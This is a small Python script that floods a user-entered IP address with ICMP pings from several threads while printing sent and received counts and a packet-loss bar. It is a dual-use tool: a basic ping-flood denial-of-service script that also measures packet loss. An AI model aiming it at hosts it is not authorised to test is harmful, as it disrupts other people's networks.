import threading
from ping3 import ping
import time

run = 1                     # Run flag
workers_nbr = 5             # Number of threads
packets_sent = 0.00
packets_received = 0.00
packets_size = 32           # Minimum 8, Maximum 1452
time_sleep = 0.05           # In Seconds


def main():
    # global workers_nbr
    # global packets_size
    # global time_sleep
    #
    # print("Execute FloodPing")
    #
    flooded_ip: str = input("Enter IP to flood: ")
    # packets_size: int = int(input("Enter packet size in bytes 8 < size < 1452: "))
    # workers_nbr: int = int(input("Enter number of threads: "))
    # time_sleep: float = float(input("Enter sleep time between each ping per thread: "))
    #

    input("Press any key to start/stop flooding")

    if not validate_ip(flooded_ip):
        print("Invalid IP")
        exit(1)

    n = threading.Thread(target=flood, args=[str(flooded_ip)])
    i = threading.Thread(target=get_input)
    n.start()
    i.start()
    print("RUN: " + str(run))


def flood(ip_addr: str):
    global run
    global workers_nbr
    global packets_sent
    global packets_received
    global time_sleep

    workers_list = []

    for i in range(workers_nbr):
        workers_list.append(threading.Thread(target=ping_host, args=[str(ip_addr)]))
        workers_list[i].start()

    while run == 1:
        time.sleep(time_sleep)
        workers_list.clear()
        for i in range(workers_nbr):
            workers_list.append(threading.Thread(target=ping_host, args=[str(ip_addr)]))
            workers_list[i].start()

        packet_loss = 100 - (packets_received / packets_sent) * 100
        summary = "Sent: " + str(packets_sent) + \
                  "\t Received: " + str(packets_received) + \
                  "\t Packet loss: " + str(packet_loss)[0:6] + " %" + "\t\t |"

        for i in range(100):
            if i<int(packet_loss):
                summary += "."
            else:
                summary += " "
        summary += "|"
        print(summary)

        if run == 0:

            time.sleep(time_sleep*2)
            print('---------------- Stopped ----------------')
            print("Calculating finished in:")

            for i in range(3):
                print(3-i)
                time.sleep(1)

            packet_loss = 100 - (packets_received / packets_sent) * 100
            summary = "Sent: " + str(packets_sent) + \
                      "\t Received: " + str(packets_received) + \
                      "\t Packet loss: " + str(packet_loss) + " %"

            print(summary)
            pass


def ping_host(ip_addr: str):
    global packets_sent
    global packets_received
    global packets_size

    packets_sent += 1
    response = ping(dest_addr=ip_addr, timeout=2, size=packets_size)
    if not response:
        return False
    else:
        packets_received += 1
        return True


def pings_summary():
    global pings_done
    global packets_received


def get_input():
    global run
    input()
    run = 0


def validate_ip(_ip_addr: str):
    ip_addr = _ip_addr.split('.')

    if len(ip_addr) != 4:
        print("Invalid IP-address input")
        return False
    else:
        print("Valid IP-address input")

    for i in range(3):
        if int(ip_addr[i]) > 255 or int(ip_addr[i]) < 0:
            print("Invalid IP range")
            return False
        else:
            print("Valid IP-address input")
    return True


if __name__ == '__main__':
    main()
